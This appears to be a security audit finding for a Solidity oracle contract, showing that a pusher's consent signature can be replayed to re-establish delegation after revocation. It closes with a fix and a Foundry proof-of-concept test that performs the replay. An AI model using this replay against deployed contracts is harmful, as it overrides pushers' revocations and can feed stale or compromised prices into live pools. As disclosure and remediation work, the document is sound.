### Title
Pusher consent signature can be replayed by creator to re-establish delegation after `revokePusher()` - (File: `smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowPushers` in `CompressedOracleV1` verifies a pusher's EIP-191 consent signature but does not consume or invalidate it. A creator who holds a pusher's valid consent signature can call `allowPushers` repeatedly with the same bytes to re-establish delegation every time the pusher self-revokes via `revokePusher()`, until the deadline expires. The pusher's revocation is therefore ineffective for the entire deadline window — an exact analog of the external report's "signature can be reused" class.

---

### Finding Description

The signed consent payload is:

```solidity
keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
``` [1](#0-0) 

The domain binds chain id, oracle address, deadline, pusher, and creator. It does **not** bind a single-use nonce or any "already-consumed" flag. After the creator calls `allowPushers` and the pusher calls `revokePusher()`:

```solidity
function revokePusher() external {
    address creator = namespaceRemapping[msg.sender];
    if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
    namespaceRemapping[msg.sender] = address(0);   // ← cleared
    emit PusherRevoked(msg.sender, creator);
}
``` [2](#0-1) 

…the creator can immediately call `allowPushers` again with the **identical** `(deadline, [pusher], [sig])` arguments. `_ensureDeadline` passes (deadline is still in the future), ECDSA recovery still returns `pusher`, and `namespaceRemapping[pusher]` is written back to `msg.sender`:

```solidity
namespaceRemapping[pusher] = msg.sender;   // re-established
``` [3](#0-2) 

The code's own NatSpec comment acknowledges the risk but incorrectly treats the deadline as a complete mitigation:

> *"The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it."* [4](#0-3) 

The deadline prevents using an **expired** signature, but it does not prevent replaying a still-valid signature. The pusher's revocation is bypassed for the entire remaining deadline window.

---

### Impact Explanation

The `fallback()` push path resolves the namespace at call time:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [5](#0-4) 

After the creator replays the consent signature, every subsequent fallback push by the pusher lands in the **creator's namespace**, not the pusher's own. In a production deployment where the pusher is an automated off-chain bot (the normal operating model), the bot does not re-check `namespaceRemapping` before each push. The creator can therefore:

1. Force the pusher's price data to continue flowing into the creator's namespace after the pusher intended to stop.
2. If the creator's namespace feeds a live `AnchoredPriceProvider` / pool, the pool continues to receive prices from a pusher who has explicitly revoked consent — prices the pusher may have stopped signing because they are stale, wrong, or from a compromised key.

This satisfies the **bad-price execution** impact gate: a pusher who revokes because their key is compromised or their data is stale cannot stop their data from reaching the pool until the deadline expires.

---

### Likelihood Explanation

- The creator already holds the pusher's consent signature (they received it during the original `allowPushers` call, which is a public on-chain transaction).
- The creator is an unprivileged party — no admin role is required.
- The replay requires only that `block.timestamp <= deadline`. Typical delegation deadlines are hours to days, giving a large replay window.
- The pusher has no on-chain way to invalidate the signature before the deadline.

---

### Recommendation

Add a per-pusher revocation counter (nonce) that is included in the signed payload and incremented on every successful `revokePusher` or `removePushers` call:

```solidity
mapping(address => uint256) public pusherNonce;

// In allowPushers:
keccak256(abi.encode(block.chainid, address(this), deadline,
                     pusher, msg.sender, pusherNonce[pusher]))

// In revokePusher / removePushers:
pusherNonce[pusher]++;
```

This makes every previously issued consent signature invalid the moment the pusher revokes, exactly as the external report's remediation (nonce in the signed payload) fixed the `CommonPool` issue.

### Proof of Concept

```solidity
function test_replay_allowPushers_after_revoke() public {
    uint256 deadline = block.timestamp + 1 days;

    // 1. Pusher signs consent once
    bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
        keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
    );
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
    bytes memory sig = abi.encodePacked(r, s, v);

    address[] memory pushers = new address[](1);
    pushers[0] = pusher;
    bytes[] memory sigs = new bytes[](1);
    sigs[0] = sig;

    // 2. Creator establishes delegation
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs);
    assertEq(oracle.namespaceRemapping(pusher), creator);

    // 3. Pusher revokes
    vm.prank(pusher);
    oracle.revokePusher();
    assertEq(oracle.namespaceRemapping(pusher), address(0));

    // 4. Creator replays the SAME signature — succeeds, revocation bypassed
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs);   // no revert
    assertEq(oracle.namespaceRemapping(pusher), creator);  // delegation re-established

    // 5. Pusher's next fallback push lands in creator's namespace, not their own
    uint56 tsMs = uint56(block.timestamp * 1000);
    uint48 raw = _packRaw(999_999, 1, 1);
    vm.prank(pusher);
    (bool ok,) = address(oracle).call(_wordAt(0, 0, raw, tsMs));
    assertTrue(ok);
    // Data lands in creator's namespace — pusher's revocation had no effect
    assertEq(oracle.getOracleData(oracle.feedIdOf(creator, 0, 0)).price,
             U64x32.decode(uint32(raw >> 16)));
    assertEq(oracle.getOracleData(oracle.feedIdOf(pusher, 0, 0)).price, 0);
}
```
